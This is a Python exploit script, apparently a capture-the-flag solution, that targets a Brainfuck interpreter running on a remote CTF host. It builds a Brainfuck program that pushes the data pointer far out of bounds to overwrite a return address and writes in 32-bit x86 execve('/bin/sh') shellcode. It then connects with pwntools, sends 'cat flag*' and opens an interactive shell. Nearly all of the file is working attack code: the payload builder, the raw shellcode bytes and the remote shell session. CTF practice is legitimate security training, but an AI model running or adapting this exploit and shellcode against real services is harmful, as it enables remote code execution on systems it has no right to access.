from pathlib import Path


def gen(n):
    if n < 0:
        return "-" * (-n)
    else:
        return "+" * (n)
def byte(x):
    assert x in range(1, 256)
    if x >= 128:
        return "<" * (256 - x)
    else:
        return ">" * x

def run(payload):
    payload = payload.encode()
    from pwn import remote

    import time
    start_time = time.time()
    io = remote("tudctf.per.lol", 1386)
    # io = remote("localhost", 1386)
    print(io.readline())
    print(len(payload))
    io.sendline(payload)
    print(io.readline().decode())
    print("--- %s seconds ---" % (time.time() - start_time))
    io.sendline(b"cat flag*")
    io.interactive()

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


payload = ""
payload += "+"*65
payload += ">" * (8 * 4096 + 0xc4)
payload += "."
payload += "-" * 0xc3 # overwrite the return
for c in shellcode:
    payload += gen(c)
    payload += ">"
payload += "<"
payload += "."
payload += "."
payload += "."
payload += "."
payload += "."
payload += "."

# Path("exploit.bf").write_text(payload)
run(payload)
